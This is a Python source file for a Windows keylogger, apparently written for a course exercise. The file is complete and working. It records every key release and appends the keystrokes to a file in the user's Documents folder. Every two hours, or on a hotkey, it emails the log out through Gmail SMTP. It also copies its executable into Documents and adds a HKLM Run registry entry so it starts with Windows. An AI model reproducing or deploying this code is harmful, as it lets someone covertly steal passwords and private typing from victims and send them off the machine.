"""
GcanDev - Keylogger Program
"""

import sys
import shutil
import keyboard  # To access keyboard events
import smtplib  # To send emails via SMTP
from threading import Timer  # To schedule functions after a time interval
from pathlib import Path  # To obtain the user's home directory
from win32api import RegCloseKey, RegOpenKeyEx, RegSetValueEx
from win32con import HKEY_LOCAL_MACHINE, KEY_WRITE, REG_SZ
import os
import logging

# Configure logging for debugging and error tracking
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# Registry key location for auto-start applications in Windows
REGISTRY_SUBKEY = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

# User's home directory
HOME_DIR = str(Path.home())

# Interval settings (in seconds):
# EMAIL_INTERVAL: Number of file save cycles before sending an email.
# FILE_SAVE_INTERVAL: Time between file saves.
# NEWLINE_INTERVAL: If no key activity for this many cycles, a newline is added.
EMAIL_INTERVAL = 360         # 360 * 20 = 7200 sec (2 hours)
FILE_SAVE_INTERVAL = 20      # 20 seconds between file saves
NEWLINE_INTERVAL = 15        # Insert a newline after 15 cycles with no activity

EMAIL_ADDRESS = "YOUR_EMAIL_ADDRESS"    # Email address created exclusively for this exercise
EMAIL_PASSWORD = "YOUR_EMAIL_PASSWORD"    # Email password for the above email
MANUAL_EXPORT_HOTKEY = "ctrl+shift+i"      # Hotkey to trigger manual export of logs


class Keylogger:
    def __init__(self, interval: int) -> None:
        """
        Initializes the keylogger.
        :param interval: Time interval in seconds for saving the log to a file.
        """
        self.interval: int = interval
        self.log: str = ""          # Log for saving to file
        self.mail_log: str = ""     # Log for sending via email
        self.counter: int = 0       # Counter to trigger email sending
        self.newline_counter: int = 0  # Counter for adding a newline if inactive
        logging.info("Keylogger initialized with a %d second interval", self.interval)

    def callback(self, event: keyboard.KeyboardEvent) -> None:
        """
        Callback function executed on every key release.
        It formats special keys and appends them to both logs.
        :param event: The keyboard event.
        """
        key_detected = event.name
        if len(key_detected) > 1:
            if key_detected == "space":
                key_detected = " "
            elif key_detected == "enter":
                key_detected = "\n"
            elif key_detected == "decimal":
                key_detected = "."
            else:
                # For other special keys, format them as [KEY]
                key_detected = key_detected.replace(" ", "_")
                key_detected = f"[{key_detected.upper()}]"
        self.log += key_detected
        self.mail_log += key_detected

    def export_logs(self) -> None:
        """
        Saves the current log to a file and, every EMAIL_INTERVAL cycles,
        sends the log content via email. Also inserts a newline after a period
        of inactivity.
        """
        if self.log.strip():
            self.save_to_file()
            self.log = ""
            self.newline_counter = 0
        else:
            self.newline_counter += 1
            if self.newline_counter >= NEWLINE_INTERVAL:
                self.log += "\n"
                self.mail_log += "\n"
                self.newline_counter = 0

        self.counter += 1
        if self.counter >= EMAIL_INTERVAL:
            if self.mail_log.strip():
                self.send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, self.mail_log)
                self.mail_log = ""
            self.counter = 0

        # Schedule the next export cycle
        timer = Timer(interval=self.interval, function=self.export_logs)
        timer.daemon = True
        timer.start()

    def save_to_file(self) -> None:
        """
        Saves the current log content to a text file in the user's Documents folder.
        The file is appended to if it already exists.
        """
        file_path = os.path.join(HOME_DIR, "Documents", "keylogger_log.txt")
        try:
            with open(file_path, "a", encoding="utf-8") as f:
                f.write(self.log + "\n")
            logging.info("Log saved to file: %s", file_path)
        except Exception as e:
            logging.error("Failed to save log to file: %s", e)

    def send_email(self, email: str, password: str, message: str) -> None:
        """
        Sends an email containing the log message via Gmail's SMTP server.
        :param email: The sender and receiver email address.
        :param password: The email password.
        :param message: The message content to be sent.
        """
        try:
            server = smtplib.SMTP(host="smtp.gmail.com", port=587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()
            logging.info("Email sent successfully.")
        except Exception as e:
            logging.error("Failed to send email: %s", e)

    def manual_export(self) -> None:
        """
        Manually exports the logs to file and sends the email.
        Triggered by a hotkey combination.
        """
        self.save_to_file()
        self.log = ""
        self.send_email(EMAIL_ADDRESS, EMAIL_PASSWORD, self.mail_log)
        self.mail_log = ""
        logging.info("Manual export executed.")

    def start(self) -> None:
        """
        Starts the keylogger by setting up the hotkey for manual export and
        registering the callback for keyboard events. Initiates the log export process.
        """
        keyboard.add_hotkey(MANUAL_EXPORT_HOTKEY, self.manual_export)
        keyboard.on_release(callback=self.callback)
        self.export_logs()
        keyboard.wait()

    def execute_on_startup(self, app_name: str, executable_path: str) -> None:
        """
        Adds a registry entry to run the keylogger automatically at Windows startup.
        :param app_name: The name to display in the registry.
        :param executable_path: The path to the keylogger executable.
        """
        try:
            key = RegOpenKeyEx(HKEY_LOCAL_MACHINE, REGISTRY_SUBKEY, 0, KEY_WRITE)
            RegSetValueEx(key, app_name, 0, REG_SZ, executable_path)
            RegCloseKey(key)
            logging.info("Startup registry entry added for %s", app_name)
        except Exception as e:
            logging.error("Failed to add startup registry entry: %s", e)


def main() -> None:
    """
    Main entry point for the keylogger application.
    Determines the executable path and copies the executable to the user's Documents folder.
    """
    # Determine the application path based on how the script is run
    if getattr(sys, "frozen", False):
        application_path = os.path.dirname(sys.executable)
    else:
        application_path = os.path.dirname(__file__)

    source_executable = os.path.join(application_path, "pec3.exe")
    destination_executable = os.path.join(HOME_DIR, "Documents", "pec3.exe")

    keylogger = Keylogger(interval=FILE_SAVE_INTERVAL)

    try:
        keylogger.execute_on_startup("FC_PEC3", destination_executable)
    except Exception as e:
        logging.error("Could not set keylogger to run at startup: %s", e)

    try:
        shutil.copy(source_executable, destination_executable)
        logging.info("Executable copied to %s", destination_executable)
    except Exception as e:
        logging.error("Failed to copy executable: %s", e)

    keylogger.start()


if __name__ == "__main__":
    main()
